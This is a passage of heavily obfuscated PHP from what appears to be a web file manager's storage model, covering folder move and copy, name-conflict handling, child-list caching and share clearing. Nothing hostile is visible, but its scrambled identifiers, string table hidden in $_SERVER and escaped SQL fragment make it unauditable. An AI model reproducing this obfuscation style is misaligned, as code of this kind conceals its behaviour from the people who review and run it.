$§«€Ø‘Ş, 0)); $èß¸ø = $this->add($§«€Ø‘Ş); $¹Ã“³— = array($Û÷‚ªù¸[193] => $èß¸ø, $Û÷‚ªù¸[32] => $ïËş•ïÉ); $this->_copyApplyMeta($¹Ã“³—, $îŠ˜«É); if ($ù”şÛªĞ[$Û÷‚ªù¸[469]] != $Û÷‚ªù¸[91]) { $îŠ˜«É[$Û÷‚ªù¸[613]][] = $ù”şÛªĞ[$Û÷‚ªù¸[525]]; return $èß¸ø; } $µ¬ìË•† = array(); $­œí = array(); $this->_childrenListAll($ó­ê®û, $µ¬ìË•†); $Ï±„ŸôÅ = count($µ¬ìË•†); if ($Ï±„ŸôÅ == 0) { return $èß¸ø; } $ÏŸ†ó˜‡ = $this->sourceInfo($èß¸ø); foreach ($µ¬ìË•† as $ÕıœÉ›ë) { $Ö¬ÛÂÜı = $this->_makeItemData($ÕıœÉ›ë, $ÏŸ†ó˜‡, $ÕıœÉ›ë[$Û÷‚ªù¸[32]]); $Ö¬ÛÂÜı[$Û÷‚ªù¸[568]] = $ÕıœÉ›ë[$Û÷‚ªù¸[568]]; $­œí[] = $Ö¬ÛÂÜı; } $this->chunkEventSet($Û÷‚ªù¸[623], array($Û÷‚ªù¸[624], $§«€Ø‘Ş, $Ï±„ŸôÅ)); $this->addAll($­œí, array(), !1); $øÑ¿Ò ú = $this->where(array($Û÷‚ªù¸[192] => $èß¸ø))->select(); $°à·×è = $this->_childrenMakeRelation($µ¬ìË•†, $øÑ¿Ò ú); $°à·×è[$ó­ê®û] = $èß¸ø; $ĞÕ †îè = array(); $É±ıªÀ° = array(); foreach ($øÑ¿Ò ú as $ÕıœÉ›ë) { $¬›·íô = $ÕıœÉ›ë[$Û÷‚ªù¸[193]]; $ÆÚËÛ±Ø = $this->_childrenMatch($°à·×è, $ÕıœÉ›ë, $ÏŸ†ó˜‡); $ĞÕ †îè[] = array($Û÷‚ªù¸[193], $¬›·íô, $Û÷‚ªù¸[192], $ÆÚËÛ±Ø[$Û÷‚ªù¸[192]]); $É±ıªÀ°[] = array($Û÷‚ªù¸[193], $¬›·íô, $Û÷‚ªù¸[568], $ÆÚËÛ±Ø[$Û÷‚ªù¸[568]]); $this->_copyApplyMeta($ÕıœÉ›ë, $îŠ˜«É); if ($ÕıœÉ›ë[$Û÷‚ªù¸[469]] != $Û÷‚ªù¸[91]) { $îŠ˜«É[$Û÷‚ªù¸[613]][] = $ÕıœÉ›ë[$Û÷‚ªù¸[525]]; } } $this->chunkEventSet($Û÷‚ªù¸[625], array($Û÷‚ªù¸[626], $§«€Ø‘Ş, $Ï±„ŸôÅ)); $this->saveAll($ĞÕ †îè); $this->chunkEventSet($Û÷‚ªù¸[627], array($Û÷‚ªù¸[628], $§«€Ø‘Ş, $Ï±„ŸôÅ)); $this->saveAll($É±ıªÀ°); return $èß¸ø; } private function _childrenMakeRelation($£Õ®Ÿ¿, $°˜úùÖ„) { $â¦êîÜ´ =& $_SERVER[÷åé¼î]; $ŸÓöá’À = array(); $†­«äŞß = array(); foreach ($£Õ®Ÿ¿ as $ã„Ò‰Œ½) { $­Äš¥¹ = $ã„Ò‰Œ½[$â¦êîÜ´[32]] . $â¦êîÜ´[8] . $ã„Ò‰Œ½[$â¦êîÜ´[568]]; $ŸÓöá’À[$­Äš¥¹] = $ã„Ò‰Œ½[$â¦êîÜ´[193]]; } foreach ($°˜úùÖ„ as $ã„Ò‰Œ½) { $­Äš¥¹ = $ã„Ò‰Œ½[$â¦êîÜ´[32]] . $â¦êîÜ´[8] . $ã„Ò‰Œ½[$â¦êîÜ´[568]]; $Ä“ôÍÖ = $ŸÓöá’À[$­Äš¥¹]; $†­«äŞß[$Ä“ôÍÖ] = $ã„Ò‰Œ½[$â¦êîÜ´[193]]; } return $†­«äŞß; } private function _childrenMatch($Öõ‰ÅÑ£, $Û¬ËìÚ”, $»úúäøş) { $ß‰ÙÔî€ =& $_SERVER[÷åé¼î]; $äøãñ­Õ = $»úúäøş[$ß‰ÙÔî€[568]]; $àš°Ò¨ğ = $this->parentLevelArray($Û¬ËìÚ”[$ß‰ÙÔî€[568]]); foreach ($àš°Ò¨ğ as $€Ã—§—º) { if (isset($Öõ‰ÅÑ£[$€Ã—§—º])) { $äøãñ­Õ .= $Öõ‰ÅÑ£[$€Ã—§—º] . $ß‰ÙÔî€[629]; } } $äøãñ­Õ = rtrim($äøãñ­Õ, $ß‰ÙÔî€[50]) . $ß‰ÙÔî€[50]; $›È†¼ğÔ = $this->parentLevelArray($äøãñ­Õ); $‡º¢¦–ç = $›È†¼ğÔ[count($›È†¼ğÔ) - 1]; return array($ß‰ÙÔî€[192] => $‡º¢¦–ç, $ß‰ÙÔî€[568] => $äøãñ­Õ); } private function _makeItemData($çŞ€®†, $ÚêÉºªÈ, $èõŠç¿) { $Ô­¡æÆÖ =& $_SERVER[÷åé¼î]; $—‚ÑëÕê = array($Ô­¡æÆÖ[630] => $çŞ€®†[$Ô­¡æÆÖ[469]], $Ô­¡æÆÖ[478] => $èõŠç¿, $Ô­¡æÆÖ[631] => $çŞ€®†[$Ô­¡æÆÖ[470]] ? $çŞ€®†[$Ô­¡æÆÖ[470]] : $Ô­¡æÆÖ[12], $Ô­¡æÆÖ[526] => $çŞ€®†[$Ô­¡æÆÖ[525]] ? $çŞ€®†[$Ô­¡æÆÖ[525]] : 0, $Ô­¡æÆÖ[601] => $çŞ€®†[$Ô­¡æÆÖ[79]] ? $çŞ€®†[$Ô­¡æÆÖ[79]] : 0, $Ô­¡æÆÖ[632] => intval($ÚêÉºªÈ[$Ô­¡æÆÖ[190]]), $Ô­¡æÆÖ[633] => intval($ÚêÉºªÈ[$Ô­¡æÆÖ[553]]), $Ô­¡æÆÖ[634] => intval(USER_ID), $Ô­¡æÆÖ[635] => intval(USER_ID), $Ô­¡æÆÖ[461] => intval($ÚêÉºªÈ[$Ô­¡æÆÖ[193]]), $Ô­¡æÆÖ[636] => $ÚêÉºªÈ[$Ô­¡æÆÖ[568]] . $ÚêÉºªÈ[$Ô­¡æÆÖ[193]] . $Ô­¡æÆÖ[50], $Ô­¡æÆÖ[482] => $çŞ€®†[$Ô­¡æÆÖ[88]] ? $çŞ€®†[$Ô­¡æÆÖ[88]] : time(), $Ô­¡æÆÖ[488] => 0, $Ô­¡æÆÖ[637] => $Ô­¡æÆÖ[12]); return $—‚ÑëÕê; } private function _copyApplyMeta($Òı©–°®, &$Î­–ÖÃª) { $ÛÈ×šõÕ =& $_SERVER[÷åé¼î]; $µÂÍË”« = $Òı©–°®[$ÛÈ×šõÕ[193]]; $ıè¤¼„ = $Òı©–°®[$ÛÈ×šõÕ[32]]; if (!isset($Òı©–°®[$ÛÈ×šõÕ[638]]) || !$Òı©–°®[$ÛÈ×šõÕ[638]] || $Òı©–°®[$ÛÈ×šõÕ[638]] == $ÛÈ×šõÕ[228]) { $Î­–ÖÃª[$ÛÈ×šõÕ[615]][] = array($ÛÈ×šõÕ[193], $µÂÍË”«, $ÛÈ×šõÕ[638], short_id($µÂÍË”«)); } if (Input::check($ıè¤¼„, $ÛÈ×šõÕ[639])) { $Î­–ÖÃª[$ÛÈ×šõÕ[614]][] = array($ÛÈ×šõÕ[193] => $µÂÍË”«, $ÛÈ×šõÕ[97] => $ÛÈ×šõÕ[522], $ÛÈ×šõÕ[434] => str_replace($ÛÈ×šõÕ[53], $ÛÈ×šõÕ[12], Pinyin::get($ıè¤¼„))); $Î­–ÖÃª[$ÛÈ×šõÕ[614]][] = array($ÛÈ×šõÕ[193] => $µÂÍË”«, $ÛÈ×šõÕ[97] => $ÛÈ×šõÕ[521], $ÛÈ×šõÕ[434] => Pinyin::get($ıè¤¼„, $ÛÈ×šõÕ[640])); } $Î­–ÖÃª[$ÛÈ×šõÕ[614]][] = array($ÛÈ×šõÕ[193] => $µÂÍË”«, $ÛÈ×šõÕ[97] => $ÛÈ×šõÕ[501], $ÛÈ×šõÕ[434] => KodSort::makeStr($ıè¤¼„)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ç¶ë’Àµ) { $ÌÛ«áÌ‡ =& $_SERVER[÷åé¼î]; $ó€ÍÙäŒ = $this->sourceInfo($Ç¶ë’Àµ); $ÏëçÚé = $ÌÛ«áÌ‡[641]; $•ÆÛÖı = array($ÌÛ«áÌ‡[568] => array($ÌÛ«áÌ‡[596], $ó€ÍÙäŒ[$ÌÛ«áÌ‡[568]] . $Ç¶ë’Àµ . $ÌÛ«áÌ‡[597]), $ÌÛ«áÌ‡[489] => $this->targetIsDelete); $¶Ò´Ò€š = $this->field($ÏëçÚé)->where($•ÆÛÖı)->select(); if (!$¶Ò´Ò€š) { return; } $¶Ò´Ò€š = array_to_keyvalue($¶Ò´Ò€š, $ÌÛ«áÌ‡[193]); foreach ($¶Ò´Ò€š as $Ëº™¨£) { $ÏîÈœ…€ = $Ëº™¨£[$ÌÛ«áÌ‡[192]]; $Ç¶ë’Àµ = $Ëº™¨£[$ÌÛ«áÌ‡[193]]; if (!isset($this->_childrenListCache[$Ç¶ë’Àµ]) && $Ëº™¨£[$ÌÛ«áÌ‡[469]] == $ÌÛ«áÌ‡[91]) { $this->_childrenListCache[$Ç¶ë’Àµ] = array(); } if (!isset($this->_childrenListCache[$ÏîÈœ…€])) { $this->_childrenListCache[$ÏîÈœ…€] = array(); } $this->_childrenListCache[$ÏîÈœ…€][$Ç¶ë’Àµ] = $Ëº™¨£; $this->_childrenItemCache[$Ç¶ë’Àµ] = $Ëº™¨£; } } private function _childrenListAll($È‹‘Îïñ, &$–­Óó›˜) { $Ú¸àª»Ã =& $_SERVER[÷åé¼î]; if (!isset($this->_childrenListCache[$È‹‘Îïñ])) { return; } $â©¿£Ş = $this->_childrenListCache[$È‹‘Îïñ]; foreach ($â©¿£Ş as $õ¿üÙÂù => $Ï„“•ÚØ) { $–­Óó›˜[$õ¿üÙÂù] = $Ï„“•ÚØ; if ($Ï„“•ÚØ[$Ú¸àª»Ã[469]] == $Ú¸àª»Ã[91]) { $this->_childrenListAll($õ¿üÙÂù, $–­Óó›˜); } } } private function sourceInfoCache($ÛÒºşñÅ) { if (isset($this->_childrenItemCache[$ÛÒºşñÅ])) { return $this->_childrenItemCache[$ÛÒºşñÅ]; } return $this->sourceInfo($ÛÒºşñÅ); } private function _childrenList($ÓÌºœ¿—) { if (isset($this->_childrenListCache[$ÓÌºœ¿—])) { return $this->_childrenListCache[$ÓÌºœ¿—]; } return $this->_childrenListSelect($ÓÌºœ¿—); } private function _childrenListSelect($–ŸÈñÚå) { $ö”¾ğí« =& $_SERVER[÷åé¼î]; $›ÑÛ¾ä = array($ö”¾ğí«[192] => $–ŸÈñÚå, $ö”¾ğí«[489] => $this->targetIsDelete); $ÑÊİ¿áá = $this->where($›ÑÛ¾ä)->select(); $ÑÊİ¿áá = $ÑÊİ¿áá ? $ÑÊİ¿áá : array(); $—ŸÇÇÚÌ = array_to_keyvalue($ÑÊİ¿áá, $ö”¾ğí«[193]); $this->_childrenListCache[$–ŸÈñÚå] = $—ŸÇÇÚÌ; foreach ($—ŸÇÇÚÌ as $–ŸÈñÚå => $Ôç®Š€) { $this->_childrenItemCache[$–ŸÈñÚå] = $Ôç®Š€; } return $—ŸÇÇÚÌ; } private function fileNameExistAuto($Èİäóˆ , $®ì‡É°Ş) { $ë¿€²î¨ =& $_SERVER[÷åé¼î]; if ($®ì‡É°Ş[$ë¿€²î¨[489]] == $ë¿€²î¨[91]) { return $this->fileNameExist($Èİäóˆ , $®ì‡É°Ş[$ë¿€²î¨[32]]); } return $this->fileNameExistCache($Èİäóˆ , $®ì‡É°Ş[$ë¿€²î¨[32]]); } private function fileNameExistCache($¬ŠÍäé­, $ÃüÔˆãæ) { $´ú”Ë¾ï =& $_SERVER[÷åé¼î]; $ÃüÔˆãæ = strtolower($ÃüÔˆãæ); $®ÔÖ—á› = $this->_childrenList($¬ŠÍäé­); foreach ($®ÔÖ—á› as $ı”ªˆ) { if ($ÃüÔˆãæ == strtolower($ı”ªˆ[$´ú”Ë¾ï[32]])) { return $ı”ªˆ[$´ú”Ë¾ï[193]]; } } return !1; } private function fileNameAutoCache($Ğ¦ığÊ¸, $à•ë«®, $ÚçÆØÁÖ, $â’¡™íø) { $ÇêÏ·Š =& $_SERVER[÷åé¼î]; $Û‰òàé = $this->_childrenList($Ğ¦ığÊ¸); $˜éÌåğ¿ = array_to_keyvalue($Û‰òàé, $ÇêÏ·Š[12], $ÇêÏ·Š[32]); return $this->fileNameAutoGet($˜éÌåğ¿, $à•ë«®, $ÚçÆØÁÖ, $â’¡™íø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ãÎÚñÇŒ, $Ì•É÷Ææ, $ÚÇ·ÉÉÕ = REPEAT_REPLACE, $ïôø‘¦” = '') { $ôğˆ¤– =& $_SERVER[÷åé¼î]; $…¦Ï¡Ú = $this->sourceInfo($ãÎÚñÇŒ); $í¦·İÚì = $this->sourceInfo($Ì•É÷Ææ); if ($…¦Ï¡Ú[$ôğˆ¤–[192]] == $í¦·İÚì[$ôğˆ¤–[193]]) { if ($…¦Ï¡Ú[$ôğˆ¤–[489]] == $ôğˆ¤–[91]) { Model($ôğˆ¤–[487])->restore(array($ãÎÚñÇŒ)); } if (!$ïôø‘¦” || $ïôø‘¦” == $…¦Ï¡Ú[$ôğˆ¤–[32]]) { return $ãÎÚñÇŒ; } } $ã‡¤¢ˆË = $this->pathInfoMore($ãÎÚñÇŒ); if ($this->isParentOf($ãÎÚñÇŒ, $Ì•É÷Ææ)) { return !1; } if (!$…¦Ï¡Ú || !$í¦·İÚì || $í¦·İÚì[$ôğˆ¤–[469]] != $ôğˆ¤–[91]) { return !1; } Hook::trigger($ôğˆ¤–[642], $ã‡¤¢ˆË); $this->targetIsDelete = intval($…¦Ï¡Ú[$ôğˆ¤–[489]]); if ($…¦Ï¡Ú[$ôğˆ¤–[192]] == $Ì•É÷Ææ && $ïôø‘¦” != $…¦Ï¡Ú[$ôğˆ¤–[32]]) { $¦“ĞãÂ² = $this->fileNameExist($Ì•É÷Ææ, $ïôø‘¦”); if ($¦“ĞãÂ² && $…¦Ï¡Ú[$ôğˆ¤–[469]] == $ôğˆ¤–[228]) { $ôè…¶ë„ = $this->sourceInfo($¦“ĞãÂ²); $­©”×Ã¸ = $this->fileHistory($ôè…¶ë„, $…¦Ï¡Ú[$ôğˆ¤–[525]], $…¦Ï¡Ú[$ôğˆ¤–[79]]); if (!$­©”×Ã¸) { Model($ôğˆ¤–[528])->remove($…¦Ï¡Ú[$ôğˆ¤–[525]]); } $this->removeNow($ãÎÚñÇŒ, !1); $this->folderSizeReset($Ì•É÷Ææ); Hook::trigger($ôğˆ¤–[643], $ã‡¤¢ˆË); return $¦“ĞãÂ²; } } $ÓƒÏ®ğè = $ïôø‘¦” ? $ïôø‘¦” : $…¦Ï¡Ú[$ôğˆ¤–[32]]; $this->lockMoveStart($ãÎÚñÇŒ); $this->lockWriteStart($Ì•É÷Ææ, $ÓƒÏ®ğè); $÷¾ÔØ¦ö = array($ôğˆ¤–[613] => array(), $ôğˆ¤–[644] => !1); $this->clearShare($ãÎÚñÇŒ, $Ì•É÷Ææ); $Òº¶†”á = $this->fileNameExistAuto($Ì•É÷Ææ, $…¦Ï¡Ú); $µä¢¼–€ = $this->_move($ãÎÚñÇŒ, $Ì•É÷Ææ, $ÚÇ·ÉÉÕ, $÷¾ÔØ¦ö, $ïôø‘¦”); $this->sourceCacheClear(); if ($…¦Ï¡Ú[$ôğˆ¤–[469]] == $ôğˆ¤–[91] && $Òº¶†”á) { $this->folderSizeResetChildren($µä¢¼–€); } Model($ôğˆ¤–[230])->linkAdd($÷¾ÔØ¦ö[$ôğˆ¤–[613]]); if ($Òº¶†”á && $÷¾ÔØ¦ö[$ôğˆ¤–[644]]) { $this->removeNow($ãÎÚñÇŒ, !1); } $this->lockMoveEnd($ãÎÚñÇŒ); $this->lockWriteEnd($Ì•É÷Ææ, $ÓƒÏ®ğè); $this->folderSizeReset($…¦Ï¡Ú[$ôğˆ¤–[192]]); $this->folderSizeReset($Ì•É÷Ææ); $“ÀÑ„Öí = array($…¦Ï¡Ú[$ôğˆ¤–[192]], $Ì•É÷Ææ); if ($…¦Ï¡Ú[$ôğˆ¤–[469]] == $ôğˆ¤–[91]) { $“ÀÑ„Öí[] = $ãÎÚñÇŒ; } $this->updateModifyTime($“ÀÑ„Öí); Model($ôğˆ¤–[617])->eventMove($ãÎÚñÇŒ, $…¦Ï¡Ú[$ôğˆ¤–[192]], $Ì•É÷Ææ); Hook::trigger($ôğˆ¤–[643], $ã‡¤¢ˆË); return $µä¢¼–€; } private function _move($”–•„º’, $ÙÈíó—œ, $”Ö°ôèò, &$Ù‹Ä™åæ, $±¬•Òçâ = '') { $‡âÎÈÇå =& $_SERVER[÷åé¼î]; $çÂ¯Ğ“ = $this->sourceInfo($”–•„º’); $€ £ÊÛº = $çÂ¯Ğ“[$‡âÎÈÇå[469]] == $‡âÎÈÇå[91]; $§ô—ÈÍ³ = $±¬•Òçâ ? $±¬•Òçâ : $çÂ¯Ğ“[$‡âÎÈÇå[32]]; $ºŸÑŸ·å = $this->fileNameExistAuto($ÙÈíó—œ, $çÂ¯Ğ“); $this->lockMoveStart($”–•„º’); $this->lockWriteStart($ÙÈíó—œ, $§ô—ÈÍ³); if (!$ºŸÑŸ·å) { return $this->_moveForce($”–•„º’, $ÙÈíó—œ, $§ô—ÈÍ³); } $Ü°œâùÚ = $ºŸÑŸ·å; $…òğù€ = !1; if ($€ £ÊÛº) { if ($”Ö°ôèò == REPEAT_RENAME_FOLDER) { $§ô—ÈÍ³ = $this->fileNameAuto($ÙÈíó—œ, $§ô—ÈÍ³, $”Ö°ôèò, $€ £ÊÛº); $Ü°œâùÚ = $this->_moveForce($”–•„º’, $ÙÈíó—œ, $§ô—ÈÍ³); } else { if ($”Ö°ôèò == REPEAT_RENAME_FOLDER) { $”Ö°ôèò = REPEAT_RENAME; } $ã²úØíÎ = $this->_childrenListSelect($”–•„º’); foreach ($ã²úØíÎ as $Â¯±õı) { $this->_move($Â¯±õı[$‡âÎÈÇå[193]], $ºŸÑŸ·å, $”Ö°ôèò, $Ù‹Ä™åæ); } $…òğù€ = !0; } } else { if ($”Ö°ôèò == REPEAT_SKIP) { $…òğù€ = !0; } else { if ($”Ö°ôèò == REPEAT_RENAME || $”Ö°ôèò == REPEAT_RENAME_FOLDER) { $§ô—ÈÍ³ = $this->fileNameAuto($ÙÈíó—œ, $§ô—ÈÍ³, $”Ö°ôèò, $€ £ÊÛº); $Ü°œâùÚ = $this->_moveForce($”–•„º’, $ÙÈíó—œ, $§ô—ÈÍ³); } else { if ($”Ö°ôèò == REPEAT_REPLACE) { $è¬»¬‰½ = $this->sourceInfoCache($ºŸÑŸ·å); $ÙíĞŸÙ… = $this->fileHistory($è¬»¬‰½, $çÂ¯Ğ“[$‡âÎÈÇå[525]], $çÂ¯Ğ“[$‡âÎÈÇå[79]]); $…òğù€ = !0; if ($ÙíĞŸÙ…) { $Ù‹Ä™åæ[$‡âÎÈÇå[613]][] = $çÂ¯Ğ“[$‡âÎÈÇå[525]]; } } } } } if ($…òğù€ && !$Ù‹Ä™åæ[$‡âÎÈÇå[644]]) { $Ù‹Ä™åæ[$‡âÎÈÇå[644]] = !0; } return $Ü°œâùÚ; } private function _moveForce($ÃõßÈÀæ, $ÕåÔäı’, $˜Õò³î) { $›£„–ßƒ =& $_SERVER[÷åé¼î]; $ºÑ¾ÃÅ£ = $this->sourceInfo($ÃõßÈÀæ); $°Ñš«¸ = $this->sourceInfo($ÕåÔäı’); $Ÿ‚ğ¼ùô = $ºÑ¾ÃÅ£[$›£„–ßƒ[469]] == $›£„–ßƒ[91]; $×¤µê„å = array($›£„–ßƒ[461] => $°Ñš«¸[$›£„–ßƒ[193]], $›£„–ßƒ[636] => $°Ñš«¸[$›£„–ßƒ[568]] . $°Ñš«¸[$›£„–ßƒ[193]] . $›£„–ßƒ[50], $›£„–ßƒ[632] => $°Ñš«¸[$›£„–ßƒ[190]], $›£„–ßƒ[633] => $°Ñš«¸[$›£„–ßƒ[553]], $›£„–ßƒ[635] => USER_ID, $›£„–ßƒ[478] => $˜Õò³î); $õ¦ÜÂ— = $ºÑ¾ÃÅ£[$›£„–ßƒ[190]] == SourceModel::TYPE_GROUP && $°Ñš«¸[$›£„–ßƒ[190]] == SourceModel::TYPE_GROUP && $ºÑ¾ÃÅ£[$›£„–ßƒ[553]] == $°Ñš«¸[$›£„–ßƒ[553]]; if (!$õ¦ÜÂ— && $this->moveClearAuth) { Model($›£„–ßƒ[551])->authClear($ÃõßÈÀæ); } $±½Üäè = $ºÑ¾ÃÅ£[$›£„–ßƒ[489]] == $›£„–ßƒ[91] && $°Ñš«¸[$›£„–ßƒ[489]] != $›£„–ßƒ[91]; if ($±½Üäè) { $×¤µê„å[$›£„–ßƒ[488]] = 0; } if ($Ÿ‚ğ¼ùô) { $Ó¶ñ»³Ş = array($›£„–ßƒ[636] => array($›£„–ßƒ[596], $ºÑ¾ÃÅ£[$›£„–ßƒ[568]] . $ºÑ¾ÃÅ£[$›£„–ßƒ[193]] . $›£„–ßƒ[597])); $ğÜ¾¯Ğ¨ = $ºÑ¾ÃÅ£[$›£„–ßƒ[568]] . $ºÑ¾ÃÅ£[$›£„–ßƒ[193]] . $›£„–ßƒ[50]; $¹éÔã½ = $°Ñš«¸[$›£„–ßƒ[568]] . $°Ñš«¸[$›£„–ßƒ[193]] . $›£„–ßƒ[50] . $ºÑ¾ÃÅ£[$›£„–ßƒ[193]] . $›£„–ßƒ[50]; $ìÌİµ³â = array($›£„–ßƒ[636] => array($›£„–ßƒ[645], "\162\145\x70\x6c\141\x63\x65\50\x70\x61\162\x65\x6e\164\114\145\x76\x65\x6c\54\x27{$ğÜ¾¯Ğ¨}\x27\x2c\47{$¹éÔã½}\47\51"), $›£„–ßƒ[632] => $°Ñš«¸[$›£„–ßƒ[190]], $›£„–ßƒ[633] => $°Ñš«¸[$›£„–ßƒ[553]]); if ($±½Üäè) { $ìÌİµ³â[$›£„–ßƒ[488]] = 0; } $this->where($Ó¶ñ»³Ş)->data($ìÌİµ³â)->save(); } $this->where(array($›£„–ßƒ[475] => $ÃõßÈÀæ))->data($×¤µê„å)->save(); return $ÃõßÈÀæ; } private function clearShare($åÅˆ¤í, $®Ù»²¯©) { $šÀìƒâ =& $_SERVER[÷åé¼î]; $ÈşêöÃ = $this->sourceInfo($åÅˆ¤í); $øæŞÃ…Ø = $this->sourceInfo($®Ù»²¯©); if ($ÈşêöÃ[$šÀìƒâ[553]] == $øæŞÃ…Ø[$šÀìƒâ[553]] && $ÈşêöÃ[$šÀìƒâ[190]] == $šÀìƒâ[646]) { return; } $Ô‹åòš÷ = array($šÀìƒâ[568] => array($šÀìƒâ[596], $ÈşêöÃ[$šÀìƒâ[568]] . $åÅˆ¤í . $šÀìƒâ[597])); $ü»Õ œÌ = $this->field($šÀìƒâ[475])->where($Ô‹åòš÷)->getField($šÀìƒâ[193], !0); if (!$ü»Õ œÌ) { return; } $Ô‹åòš÷ = array($šÀìƒâ[193] => array($šÀìƒâ[7], $ü»Õ œÌ), $šÀìƒâ[647] => 1); $˜ö•Ïß¸ = Model($šÀìƒâ[648])->field($šÀìƒâ[649])->where($Ô‹åòš÷)->select(); if (!$˜ö•Ïß¸) { return; } $˜ö•Ïß¸ = array_to_keyvalue($˜ö•Ïß¸, $šÀìƒâ[12], $šÀìƒâ[649]); $Ô‹åòš÷ = array($šÀìƒâ[649] => array($šÀìƒâ[7], $˜ö•Ïß¸)); Model($šÀìƒâ[648])->where($Ô‹åòš÷)->save(array($šÀìƒâ[647] => 0)); Model($šÀìƒâ[650])->where($Ô‹åòš÷)->delete(); } public function copyFolderFromIO($¿»¸Û“ö, $ìãÆıí£, $Ó÷æß«—, $¾ÉôúÏ, $¸ õªîØ, $ãØĞ›Ì = false) { $ú³Ş”‡Ø =& $_SERVER[÷åé¼î]; $¬›ĞªÑà = array($ú³Ş”‡Ø[614] => array(), $ú³Ş”‡Ø[615] => array(), $ú³Ş”‡Ø[613] => array(), $ú³Ş”‡Ø[651] => array()); $ë¬Æçò = $ãØĞ›Ì ? $ãØĞ›Ì : $¿»¸Û“ö->pathThis($ìãÆıí£); $Ë£±¼İŞ = $this->fileNameExist($Ó÷æß«—, $ë¬Æçò); $¢ş˜à¶ô = $this->mkdir($Ó÷æß«—, $ë¬Æçò, $¾ÉôúÏ); if (!$Ë£±¼İŞ || $¾ÉôúÏ == REPEAT_RENAME_FOLDER) { $¾ÉôúÏ = !1; } if ($Ë£±¼İŞ) { $this->_childrenAllMake($Ë£±¼İŞ); } Hook::trigger($ú³Ş”‡Ø[652]); $this->_copyChildTo($¿»¸Û“ö, $ìãÆıí£, $¢ş˜à¶ô, $¾ÉôúÏ, $¬›ĞªÑà, $¸ õªîØ); Hook::trigger($ú³Ş”‡Ø[653]); if ($¢ş˜à¶ô) { $this->folderSizeResetChildren($¢ş˜à¶ô); } $this->_childrenListClear(); Model($ú³Ş”‡Ø[616])->addAll($¬›ĞªÑà[$ú³Ş”‡Ø[614]], array(), !0); Model($ú³Ş”‡Ø[617])->eventCopy($¢ş˜à¶ô); $this->saveAll($¬›ĞªÑà[$ú³Ş”‡Ø[615]]); Model($ú³Ş”‡Ø[528])->linkAdd($¬›ĞªÑà[$ú³Ş”‡Ø[613]]); Model($ú³Ş”‡Ø[528])->remove($¬›ĞªÑà[$ú³Ş”‡Ø[651]]); $this->folderSizeReset($Ó÷æß«—); $this->updateModifyTime($Ó÷æß«—); return $¢ş˜à¶ô; } private function _copyChildTo($ØíØ£Ää, $’®”øñ…, $„”ºüáû, $ºñˆó×Ê, &$‘Õ²Æò’, $ë ¿Ë‹) { $ö¤È€± =& $_SERVER[÷åé¼î]; $¹Îàäõ¦ = $this->sourceInfoCache($„”ºüáû); $Ÿ•Ëñº‘ = $ØíØ£Ää->listPath($’®”øñ…); $Ÿ•Ëñº‘ = $Ÿ•Ëñº‘ ? $Ÿ•Ëñº‘ : array($ö¤È€±[86] => array(), $ö¤È€±[85] => array()); $º“Ûü§à = array_merge($Ÿ•Ëñº‘[$ö¤È€±[86]], $Ÿ•Ëñº‘[$ö¤È€±[85]]); $Ê­‚‚ı = $this->_addFiles($ØíØ£Ää, $Ÿ•Ëñº‘[$ö¤È€±[86]], $ë ¿Ë‹); $ÉˆŠ¶¬¬ = array(); foreach ($º“Ûü§à as &$ÊÊŸ“°Ô) { if (isset($Ê­‚‚ı[$ÊÊŸ“°Ô[$ö¤È€±[32]]])) { $ÊÊŸ“°Ô = $Ê­‚‚ı[$ÊÊŸ“°Ô[$ö¤È€±[32]]]; } $ÊÊŸ“°Ô[$ö¤È€±[469]] = $ÊÊŸ“°Ô[$ö¤È€±[33]] == $ö¤È€±[78]; $ÊÊŸ“°Ô[$ö¤È€±[470]] = substr(_get($ÊÊŸ“°Ô, $ö¤È€±[169], $ö¤È€±[12]), 0, 10); $ÊÊŸ“°Ô[$ö¤È€±[79]] = _get($ÊÊŸ“°Ô, $ö¤È€±[79], 0); $ÊÊŸ“°Ô[$ö¤È€±[525]] = _get($ÊÊŸ“°Ô, $ö¤È€±[525], 0); if (!isset($ÊÊŸ“°Ô[$ö¤È€±[654]]) && $ÊÊŸ“°Ô[$ö¤È€±[525]]) { $‘Õ²Æò’[$ö¤È€±[651]][] = $ÊÊŸ“°Ô[$ö¤È€±[525]]; } if ($ºñˆó×Ê) { $„îÆã÷ = $this->fileNameExistCache($„”ºüáû, $ÊÊŸ“°Ô[$ö¤È€±[32]]); if ($„îÆã÷) { if ($ÊÊŸ“°Ô[$ö¤È€±[469]] || $ºñˆó×Ê == REPEAT_SKIP) { continue; } if ($ºñˆó×Ê == REPEAT_REPLACE) { $›š˜Á†œ = $this->sourceInfoCache($„îÆã÷); $ğ¯š“Ñ = $this->fileHistory($›š˜Á†œ, $ÊÊŸ“°Ô[$ö¤È€±[525]], $ÊÊŸ“°Ô[$ö¤È€±[79]]); if ($ğ¯š“Ñ) { $‘Õ²Æò’[$ö¤È€±[613]][] = $ÊÊŸ“°Ô[$ö¤È€±[525]]; } continue; } else { if ($ºñˆó×Ê == REPEAT_RENAME) { $ÊÊŸ“°Ô[$ö¤È€±[32]] = $this->fileNameAutoCache($„”ºüáû, $ÊÊŸ“°Ô[$ö¤È€±[32]], $ºñˆó×Ê, !1); } } } } if (!$ÊÊŸ“°Ô[$ö¤È€±[469]] && $ÊÊŸ“°Ô[$ö¤È€±[525]] == 0) { continue; } if (!$ÊÊŸ“°Ô[$ö¤È€±[469]] && $ÊÊŸ“°Ô[$ö¤È€±[525]]) { $‘Õ²Æò’[$ö¤È€±[613]][] = $ÊÊŸ“°Ô[$ö¤È€±[525]]; } $ÉˆŠ¶¬¬[] = $this->_makeItemData($ÊÊŸ“°Ô, $¹Îàäõ¦, $ÊÊŸ“°Ô[$ö¤È€±[32]]); } unset($ÊÊŸ“°Ô); if (!empty($ÉˆŠ¶¬¬)) { $this->addAll($ÉˆŠ¶¬¬); $this->_childrenListSelect($„”ºüáû); } $“ÕÅ¬¤ = $this->_childrenList($„”ºüáû); $“ÕÅ¬¤ = array_to_keyvalue($“ÕÅ¬¤, $ö¤È€±[32]); foreach ($º“Ûü§à as $ÊÊŸ“°Ô) { $›š˜Á†œ = $“ÕÅ¬¤[$ÊÊŸ“°Ô[$ö¤È€±[32]]]; $ø­µúÊò = $›š˜Á†œ[$ö¤È€±[193]]; $this->_copyApplyMeta($›š˜Á†œ, $‘Õ²Æò’); if 